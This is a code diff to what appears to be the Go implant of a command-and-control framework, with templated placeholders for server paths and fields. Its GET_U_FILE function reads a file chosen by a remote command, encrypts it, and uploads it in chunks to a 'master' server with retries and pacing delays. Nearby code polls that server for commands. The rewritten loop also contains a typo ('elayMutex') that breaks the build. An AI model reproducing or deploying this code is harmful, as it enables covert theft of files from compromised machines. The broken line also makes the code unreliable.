@@ -624,53 +624,52 @@ func send() { //发送头部信息
         }
     }
     func GET_U_FILE(cmd, splitSize string) {
-        intSize, _ := strconv.Atoi(splitSize)
-        fileContent, _ := get_encry_f(cmd)
-        fileSize := len(fileContent)
-        start := 0
-        var maxRetry int
-        delayMutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};delayMutex.RUnlock()
-        end := intSize
-        for start < fileSize {
-            if end > fileSize {
-                end = fileSize
-            }
-            str_encry := user + "*//*" + splitSize + "*//*" + strconv.Itoa(fileSize) + "*//*" + strconv.Itoa(start) + "*//*" + strconv.Itoa(end)
-            data_encry := get_encry_s(&str_encry)
-            chunk := fileContent[start:end]
-            var buffer bytes.Buffer
-            writer := multipart.NewWriter(&buffer)
-            part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd))
-            io.Copy(part, bytes.NewReader(chunk))
-            writer.WriteField("/*uid*/", uid)
-            writer.WriteField("/*result*/", data_encry)
-            writer.Close()
-            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
-            req, _ := http.NewRequest("POST", url, &buffer)
-            req.Header.Set("Content-Type", writer.FormDataContentType())
-            req.Header.Set("Range", "bytes"+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
-            retryCount := 0
-            for {
-                resp, err := client.Do(req)
-                if err != nil || resp.StatusCode != http.StatusOK {
-                    retryCount++
-                    if resp != nil {
-                        resp.Body.Close()
-                    }
-                    if retryCount < maxRetry {
-                        time.Sleep(2 * time.Second)
-                        continue
-                    }
-                    return
-                }
-                resp.Body.Close()
-                break
-            }
-            start = end
-            end = start + intSize
-            delayMutex.RLock();time.Sleep(time.Duration(delay) * time.Second);delayMutex.RUnlock()
-        }
-    }
+	    intSize, _ := strconv.Atoi(splitSize)
+	    fileContent, _ := get_encry_f(cmd)
+	    fileSize := len(fileContent)
+	    start := 0
+	    var maxRetry int
+	    delayMutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};delayMutex.RUnlock()
+	    end := intSize
+	    for start < fileSize {
+	        if end > fileSize {
+	            end = fileSize
+	        }
+	        chunk := fileContent[start:end]
+	        retryCount := 0
+	        for retryCount < maxRetry {
+	            str_encry := user + "*//*" + splitSize + "*//*" + strconv.Itoa(fileSize) + "*//*" + strconv.Itoa(start) + "*//*" + strconv.Itoa(end)
+	            data_encry := get_encry_s(&str_encry)
+	            var buffer bytes.Buffer
+	            writer := multipart.NewWriter(&buffer)
+	            part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd))
+	            io.Copy(part, bytes.NewReader(chunk))
+	            writer.WriteField("/*uid*/", uid)
+	            writer.WriteField("/*result*/", data_encry)
+	            writer.Close()
+	            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
+	            req, _ := http.NewRequest("POST", url, &buffer)
+	            req.Header.Set("Content-Type", writer.FormDataContentType())
+	            req.Header.Set("Range", "bytes "+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
+	            resp, err := client.Do(req)
+	            if err == nil && resp.StatusCode == http.StatusOK {
+	                resp.Body.Close()
+	                break
+	            }
+	            if resp != nil {
+	                resp.Body.Close()
+	            }
+	            retryCount++
+	            time.Sleep(2 * time.Second)
+	        }
+	        if retryCount >= maxRetry {
+	            return
+	        }
+	        start = end
+	        end = start + intSize
+	        elayMutex.RLock();time.Sleep(time.Duration(delay) * time.Second);delayMutex.RUnlock()
+	    }
+	}
     func getCmd() {
         url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
         re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
